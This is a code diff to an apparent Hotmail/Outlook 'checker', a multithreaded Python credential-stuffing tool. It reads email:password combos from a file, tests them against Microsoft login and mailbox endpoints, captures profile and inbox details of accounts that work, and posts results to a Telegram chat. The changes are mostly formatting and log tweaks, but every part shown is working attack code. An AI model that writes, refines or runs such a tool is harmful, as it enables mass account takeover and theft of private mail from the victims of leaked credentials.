@@ -1,3 +1,5 @@
+import os
+import sys
 import time
 import uuid
 import pycountry
@@ -6,7 +8,6 @@ import threading
 import concurrent.futures
 import random
 import re
-import os
 from threading import Lock
 
 lock = Lock()
@@ -41,7 +42,7 @@ class HotmailChecker:
         print("[INFO] Progress thread started")
         while self.processed < self.total_combos and self.total_combos > 0:
             with lock:
-                pct = min((self.processed / self.total_combos * 100), 100)
+                pct = min((self.processed / self.total_combos * 100), 100) if self.total_combos > 0 else 0
                 bar = self.create_progress_bar(pct)
                 linked = sum(self.linked_accounts.values())
                 msg = f"""
@@ -60,7 +61,6 @@ class HotmailChecker:
                 else:
                     sent = self.bot.send_message(chat_id=self.chat_id, text=msg, parse_mode='HTML')
                     self.progress_message_id = sent.message_id
-                    print(f"[INFO] Progress message created: {self.progress_message_id}")
             except Exception as e:
                 print(f"[Progress Error] {e}")
             time.sleep(5)
@@ -89,14 +89,24 @@ class HotmailChecker:
 
     def get_capture(self, email, password, token, cid):
         try:
-            headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
+            headers = {
+                "User-Agent": "Outlook-Android/2.0",
+                "Authorization": f"Bearer {token}",
+                "X-AnchorMailbox": f"CID:{cid}"
+            }
             response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
             name = response.get('names', [{}])[0].get('displayName', 'Unknown')
             country = response.get('accounts', [{}])[0].get('location', 'Unknown')
             flag = self.get_flag(country)
 
+            # Inbox check
             url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
-            inbox_headers = {"Host": "outlook.live.com", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "x-owa-sessionid": cid}
+            inbox_headers = {
+                "Host": "outlook.live.com",
+                "authorization": f"Bearer {token}",
+                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
+                "x-owa-sessionid": cid
+            }
             inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text
 
             linked_services = []
@@ -197,7 +207,7 @@ class HotmailChecker:
         except requests.exceptions.Timeout:
             return {"status": "RETRY"}
         except Exception as e:
-            print(f"[Check Account Error] {e}")
+            print(f"[Check Error] {e}")
             return {"status": "RETRY"}
 
     def check_combo(self, email, password):
@@ -221,23 +231,21 @@ class HotmailChecker:
                 self.processed += 1
 
     def run(self, threads=200):
-        print(f"[INFO] Checker run() started with {threads} threads")
+        print(f"[INFO] Checker started with {threads} threads")
         try:
             with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                 lines = [line.strip() for line in f if ":" in line]
             self.total_combos = len(lines)
 
             if self.total_combos == 0:
-                self.send_message("❌ No valid combos found in file!")
+                self.send_message("❌ No valid combos found!")
                 return
 
-            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check...")
+            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check with 200 threads...")
 
             progress_thread = threading.Thread(target=self.update_progress, daemon=True)
             progress_thread.start()
-            print("[INFO] Progress thread launched")
 
-            print(f"[INFO] Launching {threads} worker threads")
             with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                 for line in lines:
                     try:
@@ -248,7 +256,6 @@ class HotmailChecker:
 
             time.sleep(5)
             self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad} | Retries: {self.retry}")
-            print("[INFO] Checker finished")
         except Exception as e:
             print(f"[Checker Run Error] {e}")
-            self.send_message("❌ Checker crashed. Check Railway logs.")
+            self.send_message("❌ Checker crashed. Check logs.")
